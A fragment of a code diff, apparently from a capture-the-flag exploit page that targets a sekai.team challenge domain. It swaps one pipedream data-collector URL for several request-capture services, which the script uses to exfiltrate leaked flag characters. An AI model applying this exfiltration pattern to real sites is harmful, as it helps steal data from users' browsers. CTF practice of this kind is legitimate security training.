@@ -20,7 +20,11 @@
 
     <script>
         // 多种数据收集方式
-        const DATA_COLLECTORS = ['https://eojrldtpywxpwfm.m.pipedream.net'];
+        const DATA_COLLECTORS = [
+            'https://requestbin.com/r/' + Math.random().toString(36).substr(2, 9), // 临时生成
+            'https://httpbin.org/post', // 简单测试
+            'https://postman-echo.com/post' // Postman测试服务
+        ];
         const TARGET_DOMAIN = 'nbv.chals.sekai.team';
         
         // 常见flag字符的ASCII码范围
